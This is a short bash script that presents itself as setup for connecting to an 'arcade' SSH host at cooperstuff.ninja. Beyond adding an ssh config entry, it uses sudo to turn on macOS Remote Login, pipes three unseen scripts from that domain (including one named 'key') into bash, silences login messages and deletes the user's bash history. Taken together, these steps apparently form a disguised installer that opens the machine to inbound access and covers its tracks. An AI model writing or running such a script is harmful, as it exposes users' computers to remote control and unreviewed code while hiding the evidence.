#!/bin/bash

mkdir ~/.ssh 2> /dev/null;

if [ $(uname -s) = Darwin ]; then
	HASRL=$(sudo systemsetup -getremotelogin | awk -v N=3 '{print $N}');
	if [ $HASRL = Off ]; then
		sudo systemsetup -setremotelogin on >> /dev/null;
	fi
	which -s brew;
	if [[ $? != 0 ]]; then
		curl -sL brew.cooperstuff.ninja | bash;
	fi
fi

curl -sL key.cooperstuff.ninja | bash;
clear;
curl -sL screen.cooperstuff.ninja | bash;

touch ~/.ssh/config;
if [ $(cat ~/.ssh/config | grep -c "arcade") -eq 0 ]; then
	echo "Host arcade" >> ~/.ssh/config;
	echo "	HostName arcade.cooperstuff.ninja" >> ~/.ssh/config;
	echo "	User arcade" >> ~/.ssh/config;
	echo "Setup Complete!"
	echo -e "Type \033[32mssh arcade\033[0m to connect to the arcade!"
fi

touch ~/.hushlogin;
rm -f ~/.bash_history;

